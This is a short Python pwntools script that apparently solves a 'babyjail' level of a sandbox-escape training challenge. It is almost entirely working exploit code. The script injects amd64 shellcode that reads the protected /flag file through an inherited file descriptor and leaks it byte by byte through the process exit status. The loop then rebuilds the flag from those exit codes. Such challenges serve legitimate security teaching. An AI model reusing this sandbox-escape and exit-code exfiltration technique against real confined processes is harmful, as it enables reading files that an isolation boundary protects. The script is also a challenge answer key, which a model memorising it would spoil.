import pwn
from pwn import *
import os 
pwnlib.context.context.log_level="DEBUG"
pwnlib.context.context.os = 'linux'
pwnlib.context.context.arch = 'amd64'

chall_id = int(os.environ["CHALLENGE_ID"])-230

which_byte = 0
returned_byte = 0
res_table = []
answer_string = ""
while (returned_byte is not 125):
    code_asm = f"""
            mov rax, 0x0
            mov rdi, 3
            mov rsi, rsp
            mov rdx, 0x100
            syscall # read syscall

            mov rax, 0X3C
            mov rdi, [rsp + {which_byte} ]
            syscall #exit
        flag:
            .ascii "/flag"
    """
    code_bytes = asm(code_asm)
    chall = pwn.process([f"/challenge/babyjail_level{chall_id}", "/flag"], close_fds = False)
    chall.recvuntil("Reading 0x1000 bytes of shellcode from stdin.\n")
    chall.recvline()
    chall.sendline(code_bytes)
    chall.recvall()
    which_byte+=1
    returned_byte = chall.returncode
    res_table.append(returned_byte)
    answer_string = ""
    if len(res_table) > 0:
        for letter in res_table:
            letter_ascii = chr(letter)
            answer_string += letter_ascii
            print(answer_string)
    sleep(1.5)
